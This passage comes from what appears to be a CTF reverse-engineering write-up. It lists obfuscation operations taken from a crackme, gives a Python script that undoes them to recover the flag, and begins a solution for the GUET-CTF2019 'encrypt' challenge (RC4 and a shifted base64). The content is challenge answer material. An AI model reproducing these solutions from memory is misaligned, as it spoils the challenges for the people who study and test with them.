<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line">^&#x3D;0x91</span><br><span class="line">^&#x3D;0xCD</span><br><span class="line">^&#x3D;0x6A</span><br><span class="line">^&#x3D;0x59</span><br><span class="line">^&#x3D;0xA</span><br><span class="line">^&#x3D;0xF3</span><br><span class="line">^&#x3D;0xCA</span><br><span class="line">^&#x3D;0x3E</span><br><span class="line">^&#x3D;0x6C</span><br><span class="line">^&#x3D;0x4F</span><br><span class="line">^&#x3D;0x24</span><br><span class="line">^&#x3D;0x83</span><br><span class="line">^&#x3D;0xC4</span><br><span class="line">^&#x3D;0x53</span><br><span class="line">^&#x3D;4</span><br><span class="line">^&#x3D;0x9E</span><br><span class="line">^&#x3D;0x42</span><br><span class="line">^&#x3D;0xE</span><br><span class="line">^&#x3D;0x8D</span><br><span class="line">^&#x3D;0x38</span><br><span class="line">^&#x3D;0x7A</span><br><span class="line">^&#x3D;0xDD</span><br><span class="line">^&#x3D;0x52</span><br><span class="line">^&#x3D;0x1B</span><br><span class="line">^&#x3D;0xAA</span><br><span class="line">^&#x3D;0xAE</span><br><span class="line">^&#x3D;0xF8</span><br><span class="line">^&#x3D;0x58</span><br><span class="line">^&#x3D;0xF2</span><br><span class="line">^&#x3D;0x9F</span><br><span class="line">^&#x3D;0x3C</span><br><span class="line">^&#x3D;0xA1</span><br><span class="line">^&#x3D;6</span><br><span class="line">^&#x3D;0x78</span><br><span class="line">^&#x3D;0x70</span><br><span class="line">^&#x3D;0x28</span><br><span class="line">^&#x3D;0xEA</span><br><span class="line">^&#x3D;0x48</span><br><span class="line">^&#x3D;0xE4</span><br><span class="line">^&#x3D;0x6E</span><br><span class="line">^&#x3D;0x40</span><br><span class="line">^&#x3D;0x89</span><br><span class="line">^&#x3D;0x16</span><br><span class="line">^&#x3D;0xD7</span><br><span class="line">^&#x3D;0xB5</span><br><span class="line">^&#x3D;0xD</span><br><span class="line">^&#x3D;0x17</span><br><span class="line">^&#x3D;0x5A</span><br><span class="line">^&#x3D;0xB1</span><br><span class="line">^&#x3D;0x69</span><br><span class="line">^&#x3D;0x5C</span><br><span class="line">^&#x3D;0x21</span><br><span class="line">^&#x3D;0xE5</span><br><span class="line">^&#x3D;0x7E</span><br><span class="line">^&#x3D;0x2A</span><br><span class="line">^&#x3D;0x94</span><br><span class="line">^&#x3D;0xBC</span><br><span class="line">^&#x3D;1</span><br><span class="line">^&#x3D;0x74</span><br><span class="line">^&#x3D;0x57</span><br><span class="line">^&#x3D;0x6D</span><br><span class="line">^&#x3D;0x1E</span><br><span class="line">^&#x3D;0xA2</span><br><span class="line">^&#x3D;0x6B</span><br><span class="line">^&#x3D;0x22</span><br><span class="line">^&#x3D;0xC2</span><br><span class="line">^&#x3D;0x3D</span><br><span class="line">^&#x3D;0x44</span><br><span class="line">^&#x3D;0x90</span><br><span class="line">^&#x3D;0x8C</span><br><span class="line">^&#x3D;0xB3</span><br><span class="line">^&#x3D;0xA6</span><br><span class="line">^&#x3D;0x79</span><br><span class="line">^&#x3D;0x61</span><br><span class="line">^&#x3D;0xD9</span><br><span class="line">^&#x3D;0x5B</span><br><span class="line">^&#x3D;0x1A</span><br><span class="line">^&#x3D;0x43</span><br><span class="line">^&#x3D;0x8F</span><br><span class="line">^&#x3D;0xA5</span><br><span class="line">^&#x3D;0xEE</span><br><span class="line">^&#x3D;0x25</span><br><span class="line">^&#x3D;0x46</span><br><span class="line">^&#x3D;0xE6</span><br><span class="line">^&#x3D;0x88</span><br><span class="line">^&#x3D;0x20</span><br><span class="line">^&#x3D;0x71</span><br><span class="line">^&#x3D;0xE8</span><br><span class="line">^&#x3D;9</span><br><span class="line">^&#x3D;0x8A</span><br><span class="line">^&#x3D;0x7B</span><br><span class="line">^&#x3D;0xB4</span><br><span class="line">^&#x3D;0x19</span><br><span class="line">^&#x3D;0x15</span><br><span class="line">^&#x3D;0x4A</span><br><span class="line">^&#x3D;0x47</span><br><span class="line">^&#x3D;0xDB</span><br><span class="line">^&#x3D;0x72</span><br><span class="line">^&#x3D;0x5F</span><br><span class="line">^&#x3D;0x26</span><br><span class="line">^&#x3D;0xA7</span><br><span class="line">^&#x3D;0x8B</span><br><span class="line">^&#x3D;0xBA</span><br><span class="line">^&#x3D;0xBF</span><br><span class="line">^&#x3D;0x87</span><br><span class="line">^&#x3D;0x36</span><br><span class="line">^&#x3D;0x3F</span><br><span class="line">^&#x3D;0xFE</span><br><span class="line">^&#x3D;0x77</span><br><span class="line">^&#x3D;0x1C</span><br><span class="line">^&#x3D;0x81</span><br><span class="line">^&#x3D;0x11</span><br><span class="line">^&#x3D;0x2E</span><br><span class="line">^&#x3D;0x7C</span><br><span class="line">^&#x3D;0x63</span><br><span class="line">^&#x3D;0x45</span><br><span class="line">^&#x3D;0xF4</span><br><span class="line">^&#x3D;0x56</span><br><span class="line">^&#x3D;0xF1</span><br><span class="line">^&#x3D;0xB0</span><br><span class="line">^&#x3D;0xD1</span><br><span class="line">^&#x3D;0xE0</span><br><span class="line">^&#x3D;0xF</span><br><span class="line">^&#x3D;0x93</span><br><span class="line">^&#x3D;0xD6</span><br><span class="line">^&#x3D;0x1F</span><br><span class="line">^&#x3D;0xCC</span><br><span class="line">^&#x3D;0x4B</span><br><span class="line">^&#x3D;0xCF</span><br><span class="line">^&#x3D;0xDF</span><br><span class="line">^&#x3D;0x55</span><br><span class="line">^&#x3D;0xB9</span><br><span class="line">^&#x3D;0x2B</span><br><span class="line">^&#x3D;0x85</span><br><span class="line">^&#x3D;0x31</span><br><span class="line">^&#x3D;0x29</span><br><span class="line">^&#x3D;0xFD</span><br><span class="line">^&#x3D;0x3A</span><br><span class="line">^&#x3D;0x5E</span><br><span class="line">^&#x3D;0xDE</span><br><span class="line">^&#x3D;3</span><br><span class="line">^&#x3D;0xC6</span><br><span class="line">^&#x3D;0xC1</span><br><span class="line">^&#x3D;0xC5</span><br><span class="line">^&#x3D;0x54</span><br><span class="line">^&#x3D;0xBB</span><br><span class="line">^&#x3D;0xFC</span><br><span class="line">^&#x3D;0xBE</span><br><span class="line">^&#x3D;0xEC</span><br><span class="line">^&#x3D;0xC0</span><br><span class="line">^&#x3D;0xAD</span><br><span class="line">^&#x3D;0xA4</span><br><span class="line">^&#x3D;0xD0</span><br><span class="line">^&#x3D;0x35</span><br><span class="line">^&#x3D;0xB7</span><br><span class="line">^&#x3D;0x51</span><br><span class="line">^&#x3D;0xAB</span><br><span class="line">^&#x3D;0x2D</span><br><span class="line">^&#x3D;0xAF</span><br><span class="line">^&#x3D;0x92</span><br><span class="line">^&#x3D;0x60</span><br><span class="line">^&#x3D;0xAC</span><br><span class="line">^&#x3D;0x30</span><br><span class="line">^&#x3D;0xD4</span><br><span class="line">^&#x3D;0xCB</span><br><span class="line">^&#x3D;0x9B</span><br><span class="line">^&#x3D;0x9A</span><br><span class="line">^&#x3D;0xFB</span><br><span class="line">^&#x3D;0x6F</span><br><span class="line">^&#x3D;0xF7</span><br><span class="line">^&#x3D;0x8E</span><br><span class="line">^&#x3D;0xA0</span><br><span class="line">^&#x3D;0x27</span><br><span class="line">^&#x3D;0xC9</span><br><span class="line">+&#x3D;-128</span><br><span class="line">^&#x3D;0x7D</span><br><span class="line">^&#x3D;0x9D</span><br><span class="line">^&#x3D;0x1D</span><br><span class="line">^&#x3D;0xDA</span><br><span class="line">^&#x3D;0xD8</span><br><span class="line">^&#x3D;0xEB</span><br><span class="line">^&#x3D;0xF6</span><br><span class="line">^&#x3D;0xE3</span><br><span class="line">^&#x3D;0x98</span><br><span class="line">^&#x3D;0xE1</span><br><span class="line">^&#x3D;0x34</span><br><span class="line">^&#x3D;0x82</span><br><span class="line">^&#x3D;0x7F</span><br><span class="line">^&#x3D;0xD5</span><br><span class="line">^&#x3D;0xE7</span><br><span class="line">^&#x3D;0xB8</span><br><span class="line">^&#x3D;0xDC</span><br><span class="line">^&#x3D;0x97</span><br><span class="line">^&#x3D;0xA3</span><br><span class="line">^&#x3D;7</span><br><span class="line">^&#x3D;0xB6</span><br><span class="line">^&#x3D;0xB</span><br><span class="line">^&#x3D;0x14</span><br><span class="line">^&#x3D;0xCE</span><br><span class="line">^&#x3D;0x66</span><br><span class="line">^&#x3D;0x62</span><br><span class="line">^&#x3D;0xEF</span><br><span class="line">~</span><br><span class="line">^&#x3D;0xF9</span><br><span class="line">^&#x3D;0xA9</span><br><span class="line">^&#x3D;0x4E</span><br><span class="line">^&#x3D;0xD3</span><br><span class="line">^&#x3D;0xC7</span><br><span class="line">^&#x3D;0xE2</span><br><span class="line">^&#x3D;0xD2</span><br><span class="line">^&#x3D;0x33</span><br><span class="line">^&#x3D;0xA8</span><br><span class="line">^&#x3D;0x96</span><br><span class="line">^&#x3D;0xBD</span><br><span class="line">^&#x3D;0xC</span><br><span class="line">^&#x3D;0x13</span><br><span class="line">^&#x3D;0x2F</span><br><span class="line">^&#x3D;0x73</span><br><span class="line">^&#x3D;0x65</span><br><span class="line">^&#x3D;0x9C</span><br><span class="line">^&#x3D;0x12</span><br><span class="line">^&#x3D;2</span><br><span class="line">^&#x3D;0x32</span><br><span class="line">^&#x3D;0x10</span><br><span class="line">^&#x3D;0x84</span><br><span class="line">^&#x3D;0xED</span><br><span class="line">^&#x3D;0x95</span><br><span class="line">^&#x3D;0x4D</span><br><span class="line">^&#x3D;0x75</span><br><span class="line">^&#x3D;0x2C</span><br><span class="line">^&#x3D;0x5D</span><br><span class="line">^&#x3D;0x39</span><br><span class="line">^&#x3D;0x18</span><br><span class="line">^&#x3D;0x4C</span><br><span class="line">^&#x3D;0x49</span><br><span class="line">^&#x3D;0x37</span><br><span class="line">^&#x3D;0xF0</span><br><span class="line">^&#x3D;0x99</span><br><span class="line">^&#x3D;0x41</span><br><span class="line">^&#x3D;0x86</span><br><span class="line">^&#x3D;0x76</span><br><span class="line">^&#x3D;0xF5</span><br><span class="line">^&#x3D;5</span><br><span class="line">^&#x3D;0xC8</span><br><span class="line">^&#x3D;0x64</span><br><span class="line">^&#x3D;0xFA</span><br><span class="line">^&#x3D;0x50</span><br><span class="line">^&#x3D;0x3B</span><br><span class="line">^&#x3D;8</span><br><span class="line">^&#x3D;0xE9</span><br><span class="line">^&#x3D;0x23</span><br><span class="line">^&#x3D;0xC3</span><br><span class="line">^&#x3D;0x68</span><br><span class="line">^&#x3D;0x67</span><br><span class="line">+&#x3D;80</span><br><span class="line">+&#x3D;64</span><br><span class="line">+&#x3D;79</span><br><span class="line">+&#x3D;30</span><br><span class="line">+&#x3D;91</span><br><span class="line">+&#x3D;9</span><br><span class="line">+&#x3D;5</span><br><span class="line">+&#x3D;99</span><br><span class="line">+&#x3D;87</span><br><span class="line">+&#x3D;83</span><br><span class="line">+&#x3D;59</span><br><span class="line">+&#x3D;58</span><br><span class="line">++</span><br><span class="line">+&#x3D;90</span><br><span class="line">+&#x3D;57</span><br><span class="line">+&#x3D;65</span><br><span class="line">+&#x3D;53</span><br><span class="line">+&#x3D;41</span><br><span class="line">+&#x3D;85</span><br><span class="line">+&#x3D;89</span><br><span class="line">+&#x3D;44</span><br><span class="line">+&#x3D;70</span><br><span class="line">+&#x3D;12</span><br><span class="line">+&#x3D;84</span><br><span class="line">+&#x3D;10</span><br><span class="line">+&#x3D;74</span><br><span class="line">+&#x3D;17</span><br><span class="line">+&#x3D;38</span><br><span class="line">+&#x3D;43</span><br><span class="line">+&#x3D;33</span><br><span class="line">+&#x3D;11</span><br><span class="line">+&#x3D;94</span><br><span class="line">+&#x3D;86</span><br><span class="line">+&#x3D;55</span><br><span class="line">+&#x3D;32</span><br><span class="line">+&#x3D;97</span><br><span class="line">+&#x3D;68</span><br><span class="line">+&#x3D;50</span><br><span class="line">+&#x3D;67</span><br><span class="line">+&#x3D;71</span><br><span class="line">+&#x3D;96</span><br><span class="line">+&#x3D;56</span><br><span class="line">+&#x3D;6</span><br><span class="line">+&#x3D;73</span><br><span class="line">+&#x3D;52</span><br><span class="line">+&#x3D;42</span><br><span class="line">+&#x3D;61</span><br><span class="line">+&#x3D;69</span><br><span class="line">+&#x3D;14</span><br><span class="line">+&#x3D;75</span><br><span class="line">+&#x3D;4</span><br><span class="line">+&#x3D;40</span><br><span class="line">+&#x3D;37</span><br><span class="line">+&#x3D;15</span><br><span class="line">+&#x3D;77</span><br><span class="line">+&#x3D;2</span><br><span class="line">+&#x3D;23</span><br><span class="line">+&#x3D;62</span><br><span class="line">+&#x3D;29</span><br><span class="line">+&#x3D;49</span><br><span class="line">+&#x3D;47</span><br><span class="line">+&#x3D;27</span><br><span class="line">+&#x3D;66</span><br><span class="line">+&#x3D;82</span><br><span class="line">+&#x3D;46</span><br><span class="line">+&#x3D;19</span><br><span class="line">+&#x3D;88</span><br><span class="line">+&#x3D;63</span><br><span class="line">+&#x3D;39</span><br><span class="line">+&#x3D;35</span><br><span class="line">+&#x3D;25</span><br><span class="line">+&#x3D;51</span><br><span class="line">+&#x3D;18</span><br><span class="line">+&#x3D;92</span><br><span class="line">+&#x3D;95</span><br><span class="line">+&#x3D;3</span><br><span class="line">+&#x3D;72</span><br><span class="line">+&#x3D;48</span><br><span class="line">+&#x3D;36</span><br><span class="line">+&#x3D;93</span><br><span class="line">+&#x3D;76</span><br><span class="line">+&#x3D;22</span><br><span class="line">+&#x3D;98</span><br><span class="line">+&#x3D;81</span><br><span class="line">+&#x3D;13</span><br><span class="line">+&#x3D;45</span><br><span class="line">+&#x3D;34</span><br><span class="line">+&#x3D;78</span><br><span class="line">+&#x3D;26</span><br><span class="line">+&#x3D;54</span><br><span class="line">+&#x3D;28</span><br><span class="line">+&#x3D;31</span><br><span class="line">+&#x3D;20</span><br><span class="line">+&#x3D;16</span><br><span class="line">+&#x3D;7</span><br><span class="line">+&#x3D;24</span><br><span class="line">+&#x3D;60</span><br><span class="line">+&#x3D;21</span><br><span class="line">+&#x3D;8</span><br></pre></td></tr></table></figure>
</li>
<li><p>比对的数据在后面可以找到</p>
</li>
<li><p>写脚本反处理</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x27</span>, <span class="number">0xd6</span>, <span class="number">0xd8</span>, <span class="number">0x2a</span>, <span class="number">0xda</span>, <span class="number">0x2d</span>, <span class="number">0xd7</span>, <span class="number">0x2c</span>, <span class="number">0xdc</span>, <span class="number">0xe1</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xd9</span>, <span class="number">0xdd</span>, <span class="number">0x27</span>, <span class="number">0x2d</span>, <span class="number">0x2a</span>, <span class="number">0xdc</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xe1</span>, <span class="number">0x29</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x2c</span>, <span class="number">0xda</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ls = f.readlines()[::<span class="number">-1</span>]</span><br><span class="line">    print(len(ls))</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:<span class="keyword">break</span></span><br><span class="line">       <span class="keyword">if</span> line[<span class="number">0</span>]==<span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]|=<span class="number">0x100</span></span><br><span class="line">                a[i]=~a[i]</span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;^=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> len(line)&gt;<span class="number">4</span> <span class="keyword">and</span> line[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">                num = line[<span class="number">4</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num = line[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]^=num</span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;++&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]+=<span class="number">0x100</span></span><br><span class="line">                a[i]-=<span class="number">1</span></span><br><span class="line">                a[i]&amp;=<span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;+=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> len(line)&gt;<span class="number">4</span> <span class="keyword">and</span> line[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">                num = line[<span class="number">4</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num = line[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]+=<span class="number">0x100</span></span><br><span class="line">                a[i]-=num</span><br><span class="line">                a[i]&amp;=<span class="number">0xFF</span></span><br><span class="line">    print(bytes(a))</span><br></pre></td></tr></table></figure>

<p>也可以使用IDAPython处理，也可以angr符号执行= =</p>
<h2 id="rev-GUET-CTF2019-encrypt"><a href="#rev-GUET-CTF2019-encrypt" class="headerlink" title="[rev][GUET-CTF2019]encrypt"></a>[rev][GUET-CTF2019]encrypt</h2><ol>
<li><p>rc4加密</p>
</li>
<li><p>类base64加密，只不过是加上61</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">tab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">res =[ord(i)<span class="number">-61</span> <span class="keyword">for</span> i <span class="keyword">in</span>  <span class="string">r&#x27;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\vZE=&#x27;</span>]</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    c+=tab[res[i]]</span><br><span class="line">c = c[:<span class="number">-1</span>]+<span class="string">&#x27;=&#x27;</span></span><br><span class="line">c = bytes(c,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(c)</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line">print(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    print(hex(i),end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">print()</span><br><span class="line">key = [<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">64</span>]</span><br></pre></td></tr></table></figure>

